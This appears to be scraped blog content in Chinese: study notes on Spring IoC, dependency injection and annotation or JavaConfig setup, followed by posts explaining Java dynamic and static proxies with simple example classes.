&#123; this.userDao.getUser(); &#125;&#125; 但是我们这里设置了一个Set方法，让userDao允许用户的自定义创建，那么他需要什么我们就给什么~ 最终测试类： 12345678910111213141516171819import com.ys.dao.UserDao;import com.ys.dao.UserDaoimpl;import com.ys.dao.UserMysql;import com.ys.dao.UserSQLServer;import com.ys.service.UserService;import com.ys.service.UserServiceimpl;public class TestInMine &#123; public static void main(String[] args) &#123;// 用户实际调用的是业务层，Dao层不允许他们接触！ UserServiceimpl userServiceimpl = new UserServiceimpl(); userServiceimpl.setUserDao(new UserSQLServer()); userServiceimpl.getUser();&#125;&#125; 于是在spring当中，spring帮我们操作了什么？ 我们没有NEW任何一个类，我们做的是去Spring的bean下配置xml~ 我们如下构造xml： 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;!-- 使用spring来创建我们的对象,在spring中都成为Bean--&gt; &lt;!-- 现在一个Bean相当于new 了一个对象--&gt; &lt;!-- 我们在XML当中去配置了--&gt; &lt;bean id=&quot;userMySQL&quot; class=&quot;com.ys.dao.UserMysql&quot;/&gt; &lt;bean id=&quot;userOranle&quot; class=&quot;com.ys.dao.UserOranle&quot;/&gt; &lt;bean id=&quot;userSQLServer&quot; class=&quot;com.ys.dao.UserSQLServer&quot;/&gt; &lt;bean id=&quot;userServiceimpl&quot; class=&quot;com.ys.service.UserServiceimpl&quot;&gt; &lt;property name=&quot;userDao&quot; ref=&quot;userMySQL&quot;/&gt; &lt;/bean&gt;&lt;/beans&gt; bean 就相当于new了这么一个类，ref则是取bean当中已经创建好的类。 所以我们的测试代码修改后为： 1234567891011121314import com.ys.service.UserServiceimpl;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class TestInMine &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean1.xml&quot;); UserServiceimpl userServiceimpl = (UserServiceimpl) context.getBean(&quot;userServiceimpl&quot;); userServiceimpl.getUser(); &#125;&#125; 2 IOC创建对象的方式1.使用无参构造 默认创建 123456789101112131415161718192021222324package com.ys.pojo;public class User &#123; private String name;// public User()&#123;//// System.out.println(&quot;wdndmd&quot;);//// &#125; public User(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void show()&#123; System.out.println(&quot;name:&quot;+name); &#125;&#125; 如果我在这直接将无参构造去除，那么就会出现无法构建的问题，但是Spring也支持使用有参构造 构造器函数有三种方式： 第一种，下标赋值 &lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt; &lt;/bean&gt; 1234567+ 第二种，参数类型匹配+ &#96;&#96;&#96;xml &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt; &lt;&#x2F;bean&gt; 通过参数名来进行赋值 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;www&quot;/&gt;&lt;/bean&gt; 要注意： 我们如果使用了有参构造，spring就不会走无参构造的方法了 只要我们使用new ClassPathXmlApplicationContext创建，就会把XML当中的类全部注入进去，创建新类 1234567891011121314151617181920package com.ys.pojo;public class UserT &#123; private String name; public UserT()&#123; System.out.println(&quot;userT被创建了&quot;); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public UserT(String name) &#123; this.name = name; &#125;&#125; 例如我们创建该java类 并在bean中扫描： 123&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;&gt; &lt;constructor-arg name=&quot;name&quot; value=&quot;user&quot;/&gt;&lt;/bean&gt; 我们便不会得到构造器应该返回那句话，但如果我们去掉上面的 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot;/&gt; 则会得到构造器当中的话 同时我们要知道，我们创建的时候是一样的bean，对象并没有区别： 测试代码： 12User user = (User) context.getBean(&quot;user&quot;);User user2 = (User)context.getBean(&quot;user&quot;); 两者是是一样的。 所以在配置文件加载的时候，容器中管理的对象就已经初始化了 3. Spring配置3.1 别名1&lt;alias name=&quot;userT&quot; alias=&quot;dnm&quot;/&gt; 利用这样就可以得到一个别名除此之外，我们也可以通过： 1&lt;bean id=&quot;userT&quot; class=&quot;com.ys.pojo.UserT&quot; name=&quot;userT2&quot;/&gt; 12345 User user = (User) context.getBean(&quot;user2&quot;); User user2 = (User)context.getBean(&quot;user&quot;); System.out.println(user==user2); user.show();&#125; 测试后是一样的 而且利用name的方式可以起多个别名 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot; name=&quot;user2,u2&quot;&gt; 3.2 Bean的配置3.3 importimport一般被我们用于使用团队开发使用，它可以将多个配置文件导入合并为一个，方便程序员之间互相协作。 例如我先创建了如下三个配置的xml： beans1.xml ,applicationContext.xml 以及beans.xml 在main函数当中我却只想使用一个，该如何操作呢？，这样我们应该： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;import resource=&quot;beans.xml&quot;/&gt; &lt;import resource=&quot;beans1.xml&quot;/&gt; &lt;/beans&gt; 之后再回到Mytest当中： 12ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;); 这样就相当于一口气组织了三个xml文件 同时再回到前面的别名的使用，这样的别名便于我们import合并的时候将他们合并在一起，会阻止重复的情况 4 依赖注入（DI）4.1 构造器注入前面已经说过 4.2 SET方式注入【重点】 依赖注入：本质就是set注入！ 依赖什么？ bean对象的创建依赖于容器 注入什么？ bean对象中的所有属性由容器来注入 关于复杂类型之前，我们有必要明白list，set，map都是来做什么的，以及他们的区别 详细我决定写在JAVA基础里面。 【环境搭建】 1.复杂类型 1234567891011public class Address &#123; private String address; public String getAddress() &#123; return address; &#125; public void setAddress(String address) &#123; this.address = address; &#125;&#125; 2.真实测试对象 123456789public class Student &#123; private Address address; private String name; private String[] books; private List&lt;Student&gt; hobbies; private Map&lt;String,String&gt; cards; private Set&lt;String&gt; games; private String wife; private Properties info; 这些对象的各种注入方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;!-- Bean注入，使用ref--&gt;&lt;property name=&quot;address&quot; ref=&quot;address1&quot;/&gt;&lt;property name=&quot;books&quot;&gt; &lt;array&gt; &lt;value&gt;Java基础&lt;/value&gt; &lt;value&gt;Java进程&lt;/value&gt; &lt;value&gt;Java编写&lt;/value&gt; &lt;value&gt;JavaIOC&lt;/value&gt; &lt;value&gt;JavaSpring&lt;/value&gt; &lt;/array&gt;&lt;/property&gt;&lt;property name=&quot;cards&quot;&gt; &lt;map&gt; &lt;entry key=&quot;月曜&quot; value=&quot;1751111&quot;/&gt; &lt;entry key=&quot;月石&quot; value=&quot;138217&quot;/&gt; &lt;/map&gt;&lt;/property&gt;&lt;property name=&quot;games&quot;&gt; &lt;set&gt; &lt;value&gt;战地&lt;/value&gt; &lt;value&gt;使命召唤&lt;/value&gt; &lt;value&gt;EA&lt;/value&gt; &lt;value&gt;奥里给&lt;/value&gt; &lt;/set&gt;&lt;/property&gt;&lt;property name=&quot;hobbies&quot;&gt; &lt;list&gt; &lt;value&gt;唱歌&lt;/value&gt; &lt;value&gt;下棋&lt;/value&gt; &lt;value&gt;睡觉&lt;/value&gt; &lt;/list&gt;&lt;/property&gt;&lt;property name=&quot;info&quot;&gt; &lt;props&gt; &lt;prop key=&quot;url&quot;&gt;/weibos?SSL=xxx&lt;/prop&gt; &lt;prop key=&quot;divers&quot;&gt;mysql&lt;/prop&gt; &lt;prop key=&quot;username&quot;&gt;月石&lt;/prop&gt; &lt;prop key=&quot;password&quot;&gt;月曜&lt;/prop&gt; &lt;/props&gt;&lt;/property&gt;&lt;property name=&quot;wife&quot;&gt; &lt;null/&gt;&lt;/property&gt;&lt;/bean&gt; 我在这里觉得比较重要的区别就是在于prop和map当中的差别 map因为强调的是键值对关系，所以写在map的标签当中，而prop中的值容易修改，所以我们写在标签中间。 总而言之记住就好了 测试结果如下： 123456Student&#123;address=Address&#123;address=&#x27;安徽芜湖中出&#x27;&#125;, name=&#x27;月石&#x27;,books=[Java基础, Java进程, Java编写, JavaIOC, JavaSpring],hobbies=[唱歌, 下棋, 睡觉], cards=&#123;月曜=1751111, 月石=138217&#125;, games=[战地, 使命召唤, EA, 奥里给], wife=&#x27;null&#x27;, info=&#123;password=月曜, url=/weibos?SSL=xxx, divers=mysql, username=月石&#125;&#125; 4.3 拓展方式注入除了上面的依赖注入以外，我们还可以使用P命名空间和C命名空间注入，但是他们必须利用XML约束。 具体例子如下： 123456789&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt; &lt;property name=&quot;age&quot; value=&quot;20&quot;/&gt;&lt;/bean&gt;&lt;bean class=&quot;com.ys.pojo.User&quot; id=&quot;user2&quot; p:age=&quot;20&quot; p:name=&quot;月曜&quot;/&gt;&lt;bean id=&quot;user3&quot; class=&quot;com.ys.pojo.User&quot; c:age=&quot;21&quot; c:name=&quot;月笙&quot;/&gt; 1234567891011@Testpublic void test()&#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean2.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user2&quot;, User.class); System.out.println(user); System.out.println(user2); User user3 = context.getBean(&quot;user3&quot;, User.class); System.out.println(user3); （想使用test记得导入junit哦 相同的，使用c标签就相当于使用构造器呢。 那么玩什么要使用c标签和p标签呢？ 我猜想是如果我们对这种简单的注入方式统一的使用标签来进行注入，而复杂的使用prop来进行注入，可以简化我们的代码，当xml繁琐的时候也不至于一塌糊涂了把 官方文档： namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time. 意思是不够灵活，同时需要与团队沟通好，但是可以简化代码？ 5 Bean的作用域主要是探讨原型和单例之间的差距： 单例： 之后我们创建的时候即使创建很多个类，依然只有一个原型 多例： 每创建一个新的类都会创建一个新的类 12&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;月曜&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt; 测试代码： 12345User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user&quot;, User.class); System.out.println(user.hashCode()); System.out.println(user2.hashCode()); System.out.println(user==user2); 得到结果： 1231075738627282828951false 6. Bean的自动装配 自动装配是Spring满足bean依赖的一种方式！ Spring会在上下文中自动寻找，并自动给bean装配属性 在Spring中有三种自动装配的方式： 在XML中显式的配置 在Java中显式的配置 隐式的自动装配bean【重要】 6.1 测试环境 一个人有两条狗！ Cat： 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;miao&quot;); &#125;&#125; Dog： 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;wang&quot;); &#125;&#125; Person： 1234567891011121314151617181920212223242526272829303132333435363738public class Person &#123; private Cat cat; private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; beans.xml: byName配置： 123456&lt;bean id=&quot;cat&quot; class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; byType： 123456&lt;bean class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byType&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; byName就是在上下文中寻找id和所需求匹配的值，而byType则是在上下文中去寻找和类型相同类 于是我又产生了一个疑惑，如果存在跨文件的情况呢？ 于是我又创建了一个bean1.xml来储存 123&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;dnm&quot;/&gt;&lt;/bean&gt; 得到结果： 月石 miao wang 但是如果我把beans的注释之后呢 则是 dnm miao wang 这就说明，当我们使用beans.xml装配之后，系统会优先在当前xml来进行查找，之后才会去其他地方查找 除此之外我们需要记住： 当我们使用byName的时候，必须保证当前bean的id唯一且正确 当我们使用byType的时候，必须保证当前bean的class唯一且正确 6.2使用注解实现自动装配jdk1.5支持，spring2.5支持 使用注解须知： 导入约束 配置注解的支持 必须导入如下配置： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; 之后我们便可以对单个值进行注入。 在Person类当中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.ys.pojo;import org.springframework.beans.factory.annotation.Autowired;public class Person &#123; @Autowired private Cat cat; @Autowired private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 当我们使用atuowired注入之后，甚至连set方法都不需要构造了，为什么呢？ 【据说是因为他利用反射的方式获取代码，我也不是很懂 如果bean当中的配置多起来了，我们想构造的话，就需要通过 1@Qualifier(value = &quot;cat&quot;) 显式的定义代码 7.注解开发在Spring4之后，我们必须保证Spring的AOP包被导入 在使用注解的时候需要导入context约束，增加注解的支持 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; bean 当我们使用注解之后，bean可以如下方法进入导入： 第一步，导入包： 12&lt;context:annotation-config/&gt;&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; 第二步，去类的上面添加注释： 12345678910111213@Componentpublic class User &#123; private String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; 注意@Component，这个注解的意思等价于 1&lt;bean id=&#x27;user&#x27; class=com.ys.pojo.user&gt; 属性如何注入 使用类我们也是可以注入值的： 123public class User &#123; @Value(&quot;月石&quot;) private String name; 等价于： 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; 但是通过这我们就可以明白，注解注入值不适合注入复杂类型的值。 衍生的注解 通过@Component后面为了分层，我们衍生出了如下注解： Dao: @Repository Service: @Service Controller: @Controller 这四个类的本质都没有区别，都代表注册一个bean去XML当中，只不过这样写可以使得我们MVC架构更加清晰明了 自动装配 123- @Atuowired: 自动装配- @Nullable： 允许字段为null- @Resource ：通过名字，类型自动装配 作用域 其实通过注解也可以对作用域进行注解，但是我觉得不是很方便。 1@Scope() 为什么不通过XML呢？ 小结 在这章我们学会了利用注解进行开发，可以通过注解摆脱XML，但是我通过学习这一章节，我感觉Spring此时还是不够成熟，大部分的时候还是利用XML更加方便，复杂的东西丢给XML来做，简单的利用注解注入就行 所以最佳实践应该是： 利用XML手动的建立每个bean，这样方便程序员的互相合作 XML注入MAP类型等 利用注释手动的注入简单值，降低开发成本 同时我们还需要了解： XML的优势就在于他更加清楚明了，起码在Spring来说是这样的，同时XML还方便跨文件配合 而注解更加的方便我们进行开发，注入值，降低程序员的成本（但是增加了运维的难度 使用注解开发的一个简单例子，还是一个人两个宠物： 🐱的代码： 12345678910package com.ys.pojo;import org.springframework.stereotype.Component;@Componentpublic class Cat &#123; public void shout()&#123; System.out.println(&quot;🐱：wdnmd&quot;); &#125;&#125; 🐕的代码： 12345678910package com.ys.pojo;org.springframework.stereotype.Component;@Componentpublic class Dog &#123; public void shout()&#123; System.out.println(&quot;🐕：wdnmd&quot;); &#125;&#125; 人的代码： 1234567891011121314151617181920212223242526272829303132@Componentpublic class User &#123; @Value(&quot;月石&quot;) private String name; @Autowired private Cat cat; @Autowired private Dog dog; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125;&#125; 测试代码： 1234567891011public class Mytest &#123; public static void main(String[] args) &#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); System.out.println(user.getName()); user.getCat().shout(); user.getDog().shout(); &#125;&#125; 依然能够正常的得到结果~ 8 完全使用Java配置Spring我们现在要完全使用Javaconfig完全的代替XML了，SpringBoot当中也是这样做的，我还是有点慌，感觉没有能够适应过来 还是很有必要将XML的方式和Java类的方式进行对比，如果我们想要使用Javaconfig来代替XML 构造如下Java代码: 123456789@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125;&#125; 我们使用@Configuration的意思等同于： 1&lt;beans &gt;&lt;/beans&gt; 之后我们所有的配置都可以写在该类当中 @Component(“com.ys.pojo”)类等同于如下代码： 1&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; 将两者之间进行进一步的对比，如果我们想要配置一个类的话： 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;/&gt; 这个XML标签等同于： 1234@Beanpublic User user()&#123; return new User();&#125; 那如何注入值呢？ 在XML当中我们是这样操作的： 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;月石&quot;/&gt;&lt;/bean&gt; 而到了Javaconfig之中： 123public class User &#123; @Value(&quot;月石&quot;) public String name; 我们选择直接由类来注入值！ 而Autowired依然没有变化，还是直接在包中寻找上下文的类~，比如我们尝试继续学习举例，一个人有一只猫和一个狗: 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;🐱说：wdnmdb&quot;); &#125;&#125; 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;🐕说：wndmd&quot;); &#125;&#125; 当我们使用这种方式来创建之后，就没有地方来使用@Component这个注解了，因为我们没有XML呢？ 总而言之我必须与做出这样的JavaConfig代码： 123456789101112131415161718@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125; @Bean public Cat cat()&#123; return new Cat(); &#125; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; 而我们的@Component就没有什么用武之地了..","categories":[],"tags":[{"name":"开发","slug":"开发","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"Java动态代理","slug":"Java动态代理","date":"2020-11-10T11:42:16.000Z","updated":"2020-11-10T12:50:37.496Z","comments":true,"path":"2020/11/10/Java动态代理/","link":"","permalink":"http://example.com/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"Java动态代理再当前的Java代码中几乎随处可见，因为它既可以获取Java静态代理的可拓展性，并且它也可以让我们的代码变得并不繁琐，除此之外，正是由于Java的动态代理原理是反射，故还会引出很多安全问题，我们要知道，Java的反射本身就是不安全的一件事（Private首先就变得毫无意义了） 话说回来，想要学习好动态代理，反射的学习是必不可免的，如果没有学习过我建议先学习反射，这里将一些API写罗列出来，方便没有学过反射，或者对反射并不熟悉的读者可以阅读后面的文章 反射APIgetClass[一个实例对象].getClass ,将返回实例的类，我这里用如下代码进行演示： 例子： 123456789101112131415161718192021222324252627import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass()); &#125;;&#125;class myDemo&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;;&#125; 当前代码的输出结果为： 我们可以很清楚的发现，获取了该对象 getclass().getInterfaces()其实我们读名字也可以很清楚的明白它的用途了，用于获取当前的继承的接口 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getInterfaces()); &#125;;&#125;interface bark&#123; void jiao();&#125;class myDemo implements bark&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;; public void jiao() &#123; System.out.println(&quot;jiao&quot;); &#125;&#125; 返回结果为： 1[Ljava.lang.Class;@7f31245a 这里便得到了类的接口了，只不过这里是以流的方式进行传输 getClass().getName()这样的也很简单理解，我们即使getClass了，程序却不知道它的名字，程序只知道是一个类，故我们使用getName即可得到当前实例的类的名字（String形式） 1234567public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getName()); &#125;; 好像写一个动态代理也就用到了这些，嘛，继续往下吧 动态代理2.1 接口首先和静态代理是一样的，我们也需要构筑一个接口： 123456789package myProxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; 同样的，业务实体是不可避免的 2.2实体类：12345678910111213141516171819package myProxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;增添了一个新用户&quot;); &#125; public void delete() &#123; System.out.println(&quot;删除了一个用户&quot;); &#125; public void update() &#123; System.out.println(&quot;更新了一个用户&quot;); &#125; public void query() &#123; System.out.println(&quot;查询了一个用户&quot;); &#125;&#125; 而代理类，通过动态代理我们可以直接的生成，取消繁琐的操作 如果用静态代理，我们的代理是这样的： 12345678910111213141516171819202122232425262728293031323334package myProxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;删除&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;更新&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;查询&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]执行了&quot;+name+&quot;方法&quot;); &#125;&#125; 而使用动态代理之后： 2.3代理类123456789101112131415161718192021222324252627282930package Demo3;import myProxy2.UserServiceImp;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler &#123; private UserServiceImp userServiceImp;// IOC，让用户自定义需要什么接口来决定代理类 public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125;// 生成代理类 public Object getProxy()&#123; return Proxy.newProxyInstance(this.getClass().getClassLoader(), userServiceImp.getClass().getInterfaces(),this); &#125; // 必须重写的接口，并返回接口 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; Object result = method.invoke(userServiceImp, args); return result; &#125;&#125; 我们发现不再需要一个一个套模板往上写了，如果我们需要增添新功能，只需要这样做： 1234567891011 // 必须重写的接口，并返回接口 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; log(method.getName()); Object result = method.invoke(userServiceImp, args); return result; &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]使用了&quot;+name+&quot;方法&quot;); &#125;&#125; 虽然我们前面去写生成一个的代码量看似很大，但是实际上这段代码是一个工具用的代码，是写死的。业务代码相当的端，从几十行骤减到十来行，并且我们的代理类不会随着工程的变大而变大，我们通过反射之后获取了类的方法 而源码当中，invoke方法实际上也是通过setAccessible来实现的","categories":[],"tags":[]},{"title":"静态代理","slug":"静态代理","date":"2020-11-09T13:36:53.000Z","updated":"2020-11-17T06:15:20.429Z","comments":true,"path":"2020/11/09/静态代理/","link":"","permalink":"http://example.com/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"好久没用了都有点忘了，现在捡起来学一下，之后还有用 静态代理结合出租房子理解 通过图示，我们分析一个例子： 客户需要租一个房子 房东需要租出房子 这个时候两者之间的合同很纯粹，如果两者认识，就不需要中介，直接对接把房子租出去就很简单很快了对吧？但是现实往往不是这样，更可能的是如下情况： 房东和客户互不相识，需要签订各种合同保证对方不会后悔 一个客户肯定不会只看房子，他需要看多个房子来选择自己心仪的房子 房东不可能时时刻刻都守着房子，等一个一个的客户上门来看 在这种情况下，用户的需求和房东的客户都相当不纯粹了，需要经过很多步骤才可以转换到位 在现实生活中，正是由于这种情况的出现，所以出现了房屋中介，解决各种客户的情况，由房屋中介来给客户们解决各种问题，经过中介处理，双方的情况又变得纯粹了起来，而繁琐的事情交给中介来处理即可 而代码一样如此，这种情况的出现几乎处处可见，比如我们可能需要处理数据库，中间需要对数据进行各种处理，这种情况就和上面的合同一样。 话说回来，我们如何处理租房子的情况呢？这里我写了一小段代码来做出范例： 我们可以将这个事情抽象成四个part： 出租房子这件事情 谁出租？ 房东 谁要房子？ 客户 谁来处理复杂情况？ 中介 分析完之后我们可以着手于代码 出租房子这件事情： 12345package Proxy;public interface Rent &#123; public void rent();&#125; 房东: 12345678package Proxy;public class Host implements Rent&#123; public void rent() &#123; System.out.println(&quot;房东租出房子&quot;); &#125;&#125; 中介： 123456789101112131415161718192021222324252627package Proxy;public class MyProxy implements Rent &#123; private Host host; public MyProxy(Host host) &#123; this.host = host; &#125; public void rent() &#123; seeHouse(); host.rent(); takeMoney(); giveMoney(); &#125; public void seeHouse()&#123; System.out.println(&quot;中介带你看房子&quot;); &#125; public void takeMoney()&#123; System.out.println(&quot;中介收你钱&quot;); &#125; public void giveMoney()&#123; System.out.println(&quot;中介给钱给房东&quot;); &#125;&#125; 客户： 123456789101112package Proxy;import org.junit.Test;public class MyTest &#123; @Test public void test1()&#123; MyProxy proxy = new MyProxy(new Host()); proxy.rent(); &#125;&#125; 在上面的例子当中，我们可以发现，静态代理帮我们完成了如下事情： 使得需要再次明确起来，无论是客户还是房东，需求都变得相当简单 复杂的事情交给了中介来做 但是我们也发现了一个缺点： 我们的代码量明显提升了很多，相比于直接添加功能 除此之外，如果客户很多，我们不得不手动添加一个个客户，工作量更大了。 结合增删改查事务理解在上面的例子中，我们学习到了代理模式的第一个好处，接下的例子将进一步表露出上面的设计模式的好处，并且它会展现静态代理的第二个好处，添加新功能而不修改原有代码 增删改查事务： 12345678package Proxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; 业务实现： 12345678910111213141516171819package Proxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;增添了一个新用户&quot;); &#125; public void delete() &#123; System.out.println(&quot;删除了一个用户&quot;); &#125; public void update() &#123; System.out.println(&quot;更新了一个用户&quot;); &#125; public void query() &#123; System.out.println(&quot;查询了一个用户&quot;); &#125;&#125; 